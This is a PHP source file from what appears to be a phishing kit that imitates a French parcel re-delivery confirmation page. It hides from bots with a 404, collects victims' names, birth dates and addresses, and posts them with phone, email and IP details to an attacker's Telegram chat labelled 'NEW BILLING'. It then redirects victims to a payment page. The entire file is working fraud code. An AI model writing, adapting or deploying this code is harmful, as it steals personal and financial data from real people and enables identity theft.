<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['token']) && $_POST['token'] === $token) {
        if (
            empty($_POST['firstName']) ||
            empty($_POST['lastName']) ||
            empty($_POST['birthDate']) ||
            empty($_POST['address']) ||
            empty($_POST['zipCode']) ||
            empty($_POST['city'])
        ) {
            if (empty($_POST['firstName'])) {
                return header('location: ./info?id=' . $token . '&empty');
            }
            if (empty($_POST['lastName'])) {
                return header('location: ./info?id=' . $token . '&empty1');
            }
            if (empty($_POST['birthDate'])) {
                return header('location: ./info?id=' . $token . '&empty2');
            }
            if (empty($_POST['address'])) {
                return header('location: ./info?id=' . $token . '&empty3');
            }
            if (empty($_POST['zipCode'])) {
                return header('location: ./info?id=' . $token . '&empty4');
            }
            if (empty($_POST['city'])) {
                return header('location: ./info?id=' . $token . '&empty5');
            }
            return;
        }
        $_SESSION['name'] = htmlspecialchars($_POST['firstName']) . ' ' .  htmlspecialchars($_POST['lastName']);
        $_SESSION['birthDate'] = htmlspecialchars($_POST['birthDate']);
        $_SESSION['address'] = htmlspecialchars($_POST['address']);
        $_SESSION['city'] = htmlspecialchars($_POST['city']);
        $_SESSION['zip'] = htmlspecialchars($_POST['zipCode']);

        telegram_api($config['token'], 'sendMessage', [
            'chat_id' => $config['billing'],
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    $btnBl
                ]
            ]),
            'text' => "<b>🇫🇷 NEW BILLING</b>
                
👤 Full name  <code>" . $_SESSION['name'] . "</code>
⏰ Date of birth <code>" . $_SESSION['birthDate'] . "</code>
⏰ Livrasion <code>" . $_SESSION['date'] . "</code>
📞 Phone <code>" . $_SESSION['tel'] . "</code>
📩 Email <code>" . $_SESSION['email'] . "</code>
🏡 Address <code>" . $_SESSION['address'] . "</code>
🏡 City <code>" . $_SESSION['city'] . "</code>
🏡 ZIP code <code>" . $_SESSION['zip'] . "</code>" . victim_infos($ip, $check),
            'parse_mode' => 'HTML'
        ]);
        header('location: ./pay?id=' . $token);
    }
} else {
    require_once(b . '/views/components/header.php');
?>
    <h2>Numéro de suivi : <?= $config['code'] ?></h2>
    <form method="post" novalidate='novalidate'>
        <input type="hidden" name="token" value="<?= htmlspecialchars($token) ?>" />
        <h4>Confirmez votre créneau de livraison pour le <?= $_SESSION['date'] ?></h4>
        <p>Afin de pouvoir confirmer ce créneau de livraison, merci de compléter les informations suivantes :</p>
        <h3>Informations personnelles</h3>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_firstName" name="firstName" required="required" placeholder=""><label for="confirmation_form_firstName" class="required">Prénom</label></div>
        <?php if (isset($_GET["empty"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_lastName" name="lastName" required="required" placeholder=""><label for="confirmation_form_lastName" class="required">Nom</label></div>
        <?php if (isset($_GET["empty1"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_birthDate" name="birthDate" required="required"
                class="js-date" placeholder="" inputmode="numeric" pattern="\d*" maxlength="10"><label class="placeLabel required" for="confirmation_form_birthDate">Date de naissance</label></div>
        <?php if (isset($_GET["empty2"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_address" name="address" required="required" placeholder=""><label for="confirmation_form_address" class="required">Adresse</label></div>
        <?php if (isset($_GET["empty3"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_zipCode" name="zipCode" required="required" placeholder="" inputmode="numeric" pattern="\d*"><label for="confirmation_form_zipCode" class="required">Code postal</label></div>
        <?php if (isset($_GET["empty4"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="text" id="confirmation_form_city" name="city" required="required" placeholder=""><label for="confirmation_form_city" class="required">Ville</label></div>
        <?php if (isset($_GET["empty5"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <div>
            <button type="submit" id="tracking_form_submit">Confirmer ma re-livraison</button>
        </div>
    </form>
<?php
    require_once(b . '/views/components/footer.php');
}
